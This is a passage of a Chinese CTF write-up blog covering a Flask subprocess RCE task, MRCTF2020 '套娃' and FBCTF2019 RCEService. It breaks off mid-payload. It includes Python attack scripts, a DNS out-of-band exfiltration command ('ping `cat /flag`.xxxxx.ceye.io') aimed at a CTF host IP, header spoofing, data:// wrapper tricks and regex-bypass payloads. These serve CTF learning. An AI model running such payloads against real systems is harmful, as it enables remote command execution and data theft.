&#39;b&#39;], 123)</code>来实现。</p><p><code>hint</code>函数则是利用了<code>gett</code>和<code>sett</code>函数来实现对<code>subprocess</code>模块的某个属性的修改。它首先用<code>gett</code>函数获取到属性的值，然后修改其中的某个元素，最后再用<code>sett</code>函数设置回去。</p><p>举一个例子来说明这三个函数的结合使用：</p><p>假设我们有一个对象<code>obj</code>，它有一个嵌套属性<code>a.b.c</code>，我们想要将其值设置为<code>True</code>。可以先通过<code>gett(obj, [&#39;a&#39;, &#39;b&#39;])</code>获取到<code>obj.a.b</code>的值，然后将其属性<code>c</code>设置为<code>True</code>，最后再通过<code>sett(obj, [&#39;a&#39;, &#39;b&#39;], new_value)</code>将新的值设置回去。其中，<code>new_value</code>就是修改后的<code>obj.a.b</code>的值。</p><p>以上就是对<code>hint</code>、<code>gett</code>和<code>sett</code>三个函数的结合分析和例子说明。</p></blockquote><h2 id="subprocess-call"><a href="#subprocess-call" class="headerlink" title="subprocess.call()"></a>subprocess.call()</h2><blockquote><p>执行由参数提供的命令,返回状态码<br>我们可以用数组作为参数运行命令,也可以用字符串作为参数运行命令(通过设置参数shell=True)<br>注意,参数shell默认为False</p></blockquote><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>利用<code>subprocess.call()</code>执行命令需要其默认参数<code>shell=True</code></p><p>而<code>hint()</code>函数恰好提供了对应的功能</p><p>接下来就是设法找到shell参数的位置</p><h5 id="寻找shell参数的位置"><a href="#寻找shell参数的位置" class="headerlink" title="寻找shell参数的位置"></a>寻找shell参数的位置</h5><p>在python中，函数也是一种对象</p><blockquote><p>Python确实有一个内置类型叫做 “function”，它代表了Python中的函数对象。</p><p>函数对象在Python中是一等公民，这意味着它们可以被赋值给变量，作为参数传递给其他函数，以及作为返回值返回。函数对象还具有一些内置方法和属性，例如 <code>__name__</code>、<code>__doc__</code> 和 <code>__call__</code>。</p></blockquote><p>其中一个内置方法：</p><blockquote><p><code>__defaults__</code>：函数的默认参数值的元组</p></blockquote><p>然而，这还不够</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">getattr</span>(subprocess.call,<span class="hljs-string">&quot;__defaults__&quot;</span>))<br><span class="hljs-comment">#None</span><br></code></pre></td></tr></table></figure><p>None表示空</p><p><em>山重水复疑无路，柳暗花明又一村</em></p><p>查询<code>subprocess</code>源码(subprocess.py)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">call</span>(<span class="hljs-params">*popenargs, **kwargs</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Run command with arguments.  Wait for command to complete, then</span><br><span class="hljs-string">    return the returncode attribute.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    The arguments are the same as for the Popen constructor.  Example:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    retcode = call([&quot;ls&quot;, &quot;-l&quot;])</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> Popen(*popenargs, **kwargs).wait()<br></code></pre></td></tr></table></figure><p>注意到调用了<code>Popen()</code>并把参数传了过去</p><p><code>popen</code>是一个对象(类)</p><p>这样操作会调用<code>Popen</code>中的魔术方法<code>__init__</code></p><p>其参数中同样有我们想要修改的<code>shell</code>参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">__init__(self, args, bufsize=<span class="hljs-number">0</span>, executable=<span class="hljs-literal">None</span>,<br>                 stdin=<span class="hljs-literal">None</span>, stdout=<span class="hljs-literal">None</span>, stderr=<span class="hljs-literal">None</span>,<br>                 preexec_fn=<span class="hljs-literal">None</span>, close_fds=<span class="hljs-literal">False</span>, shell=<span class="hljs-literal">False</span>,<br>                 cwd=<span class="hljs-literal">None</span>, env=<span class="hljs-literal">None</span>, universal_newlines=<span class="hljs-literal">False</span>,<br>                 startupinfo=<span class="hljs-literal">None</span>, creationflags=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">getattr</span>(subprocess.Popen.__init__,<span class="hljs-string">&quot;__defaults__&quot;</span>))<br><span class="hljs-comment">#(-1, None, None, None, None, None, True, False, None, None, None, None, 0, True, False, ())</span><br></code></pre></td></tr></table></figure><p>经多次测试，其中下标为7处的元素为默认参数<code>shell</code>的值</p><p>更改参数脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> json  <br>  <br>data = &#123;  <br>    <span class="hljs-string">&quot;exp&quot;</span>: [<span class="hljs-string">&quot;Popen&quot;</span>,<span class="hljs-string">&quot;__init__&quot;</span>,<span class="hljs-string">&quot;__defaults__&quot;</span>]  <br>&#125;  <br>params=&#123;<br>    <span class="hljs-string">&#x27;num&#x27;</span>: <span class="hljs-string">&quot;7&quot;</span>,  <br>    <span class="hljs-string">&#x27;bol&#x27;</span>: <span class="hljs-literal">True</span>  <br>&#125;<br>r = requests.post(<span class="hljs-string">&#x27;http://127.0.0.1:5000/&#x27;</span>, json=data,params=params)  <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求头是：&quot;</span>, r.request.headers)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求体是：&quot;</span>, r.request.body)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="获取回显"><a href="#获取回显" class="headerlink" title="获取回显"></a>获取回显</h3><p>根据代码逻辑</p><p>命令执行是没有回显的</p><p>此时可以使用<strong>dns/http外带</strong>  </p><h4 id="dns-http外带"><a href="#dns-http外带" class="headerlink" title="dns/http外带"></a>dns/http外带</h4><p>需要平台</p><p>比如<a href="http://ceye.io/records/dns?_blank">CEYE - Monitor service for security testing</a>   </p><p>burpsuit也有类似功能</p><p>具体：<a href="https://cloud.tencent.com/developer/article/1956480?_blank">带外攻击OOB（RCE无回显骚思路总结）-腾讯云开发者社区-腾讯云 (tencent.com)</a>  </p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> json  <br>  <br>params=&#123;<br>    <span class="hljs-string">&#x27;exec&#x27;</span>: <span class="hljs-string">&quot;ok&quot;</span>,  <br>    <span class="hljs-string">&#x27;shell&#x27;</span>: <span class="hljs-string">&quot;ping -c 3 `cat /flag`.xxxxx.ceye.io&quot;</span>  <span class="hljs-comment">#-c 3 请求三次</span><br>&#125;<br>r = requests.get(<span class="hljs-string">&#x27;http://112.6.51.212:30434/&#x27;</span>, params=params)  <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求头是：&quot;</span>, r.request.headers)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求体是：&quot;</span>, r.request.body)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>命令执行过程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#发现flag文件</span><br><span class="hljs-built_in">ls</span> /|grep <span class="hljs-string">&#x27;f&#x27;</span>|<span class="hljs-built_in">base64</span> <span class="hljs-comment">#将根目录下以f开头的文件或文件夹以回车键隔开并进行base64编码</span><br><span class="hljs-comment">#读取flag</span><br><span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>先执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> json  <br>  <br>data = &#123;  <br>    <span class="hljs-string">&quot;exp&quot;</span>: [<span class="hljs-string">&quot;Popen&quot;</span>,<span class="hljs-string">&quot;__init__&quot;</span>,<span class="hljs-string">&quot;__defaults__&quot;</span>]  <br>&#125;  <br>params=&#123;<br>    <span class="hljs-string">&#x27;num&#x27;</span>: <span class="hljs-string">&quot;7&quot;</span>,  <br>    <span class="hljs-string">&#x27;bol&#x27;</span>: <span class="hljs-literal">True</span>  <br>&#125;<br>r = requests.post(<span class="hljs-string">&#x27;http://127.0.0.1:5000/&#x27;</span>, json=data,params=params)  <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求头是：&quot;</span>, r.request.headers)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求体是：&quot;</span>, r.request.body)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>再执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> json  <br>  <br>params=&#123;<br>    <span class="hljs-string">&#x27;exec&#x27;</span>: <span class="hljs-string">&quot;ok&quot;</span>,  <br>    <span class="hljs-string">&#x27;shell&#x27;</span>: <span class="hljs-string">&quot;ping -c 3 `cat /flag`.xxxxx.ceye.io&quot;</span>  <br>&#125;<br>r = requests.get(<span class="hljs-string">&#x27;http://127.0.0.1:5000/&#x27;</span>, params=params)  <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求头是：&quot;</span>, r.request.headers)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求体是：&quot;</span>, r.request.body)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>本文引用几乎全部来自<a href="https://yiyan.baidu.com/">文心一言 (baidu.com)</a> </p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>rce</tag>
      
      <tag>python</tag>
      
      <tag>flask</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2020 套娃</title>
    <link href="/2023/09/05/%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/"/>
    <url>/2023/09/05/%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/</url>
    
    <content type="html"><![CDATA[<h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p>先看页面源代码，发现有代码注释：</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/2023090501.6ntjcld4z0s0.png" alt="2023090501"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br> <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>要传入<code>b_u_p_t</code>参数，但是不能有<code>_</code></p><blockquote><p><strong>注意</strong>:</p><p>变量名中的点和空格被转换成下划线。例如 <code>&lt;input name=&quot;a.b&quot; /&gt;</code> 变成了 <code>$_REQUEST[&quot;a_b&quot;]</code>。</p></blockquote><p>所以我们可以传入<code>b u p t</code>或<code>b.u.p.t</code>实现绕过。</p><p>在正则表达式中<code>^</code>代表从字符串起始处匹配，<code>$</code>代表结尾，<code>/^23333$/</code>要求字符串恰好等于<code>23333</code>。</p><p>所以第二个<code>if</code>语句意思是<code>b_u_p_t</code>的值不能等于(强比较)<code>23333</code>，但要通过正则匹配。</p><p>在非多行模式下(即没有<code>/s</code>)，<code>$</code>会忽略在句尾的<code>%0a</code></p><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需传入<code>?a=flag%0a</code></p><p>同理，本题中传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?b.u.p.t=23333%0a<br></code></pre></td></tr></table></figure><p>即可。</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/2023090502.6ukjogue99o0.png" alt="2023090502"></p><p>提示flag在<code>secrettw.php</code></p><p>访问并查看页面源代码：</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/2023090503.5ki7rsypwl40.webp" alt="2023090503"></p><p><del>有脏东西</del></p><p>这东西很长，在那一行上双击可快速选中该行。</p><p>这是<code>Jsfuck</code>编码,详情见<a href="https://www.jianshu.com/p/e7246218f424">Jsfuck – 一个很有意思的Javascript特性</a>  </p><p>可以直接使用在线工具解码，比如<a href="http://www.hiencode.com/jsfuck.html">CTF在线工具-在线JSfuck加密|在线JSfuck解密|JSfuck|JSfuck原理|JSfuck算法 (hiencode.com)</a></p><p>也可以将其复制到浏览器控制台中：</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/20230504.4zo7re19ers0.webp" alt="20230504"></p><p><strong>post me Merak</strong>  </p><p>用post方法传入一个名为<strong>Merak</strong>的变量，变量值随意。</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/20230505.2yo0imubqss0.webp" alt="20230505"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)         <span class="hljs-comment">#ip检测</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;  <br>    <span class="hljs-comment">#考察php伪协议</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;    <span class="hljs-comment">#代码逆向</span><br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><h2 id="过ip检测"><a href="#过ip检测" class="headerlink" title="过ip检测"></a>过ip检测</h2><p>添加报文，据我所知有两种方法</p><ul><li><code>X-Forwarded-For: 127.0.0.1</code>    </li><li><code>Client-ip: 127.0.0.1</code></li></ul><p>这里不知道为什么第一个不行，只能使用第二个。</p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>这里可以使用data伪协议，对于data,</p><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">// 打印 &quot;I love PHP&quot; </span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>同理，本题传入:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=            #todat is a happy day<br></code></pre></td></tr></table></figure><h2 id="代码逆向"><a href="#代码逆向" class="headerlink" title="代码逆向"></a>代码逆向</h2><p>我用python写了个<code>change()</code>的逆向函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"> <br><span class="hljs-comment"># function change($v)&#123; </span><br><span class="hljs-comment">#     $v = base64_decode($v); </span><br><span class="hljs-comment">#     $re = &#x27;&#x27;; </span><br><span class="hljs-comment">#     for($i=0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="hljs-comment">#         $re .= chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="hljs-comment">#     &#125; </span><br><span class="hljs-comment">#     return $re; </span><br><span class="hljs-comment"># &#125; </span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">v</span>):<br>    re=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v)):<br>        re += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(v[i]) - i*<span class="hljs-number">2</span>); <br>    re=base64.b64encode(re.encode())<br>    <span class="hljs-keyword">return</span> re.decode()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    s=<span class="hljs-string">&quot;flag.php&quot;</span>   <br>    <span class="hljs-built_in">print</span>(change(s))<br><span class="hljs-comment">#ZmpdYSZmXGI=</span><br></code></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/20230506.6qujc55rgp80.webp" alt="20230506"></p><h2 id="参考（引用）"><a href="#参考（引用）" class="headerlink" title="参考（引用）"></a>参考（引用）</h2><p>[<a href="https://blog.csdn.net/RABCDXB/article/details/118917303">MRCTF2020]套娃_ctf套娃密码_Sk1y的博客-CSDN博客</a>  </p><p><a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_match绕过总结 - MustaphaMond - 博客园 (cnblogs.com)</a>  </p><p><a href="https://www.php.net/manual/zh/language.variables.external.php">PHP: 来自 PHP 之外的变量 - Manual</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>PHP</tag>
      
      <tag>正则</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FBCTF2019 RCEService</title>
    <link href="/2023/09/04/%5BFBCTF2019%5DRCEService/"/>
    <url>/2023/09/04/%5BFBCTF2019%5DRCEService/</url>
    
    <content type="html"><![CDATA[<h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><p>这题是有源码的（别管怎么来的了，我看的十几篇wp都没说清楚）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$json</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid input&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了很多东西  </p><blockquote><ol><li>代码中使用<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code> 配置系统环境变量，而我们用不了 cat 也有可能是在这个环境变量下没有这个二进制文件。我们可以直接使用<code>/bin/cat</code> 来调用cat命令。</li><li>Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</li></ol></blockquote><h2 id="两种解法"><a href="#两种解法" class="headerlink" title="两种解法"></a>两种解法</h2><h3 id="1-0a换行绕过"><a href="#1-0a换行绕过" class="headerlink" title="1. %0a换行绕过"></a>1. %0a换行绕过</h3><p>由于加了修饰符s后.才会匹配换行符，所以此处利用<code>%0a</code>(换行符经过<code>url</code>编码后)进行绕过。</p><p>另外要注意表达式中存在一段<code>\x00-\x1F</code>会匹配一个<code>%0a</code>，但多在payload前后加几个<code>%0a</code>就行了。</p><p>发现flag位置：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=&#123;%0a<span class="hljs-string">&quot;cmd&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;ls 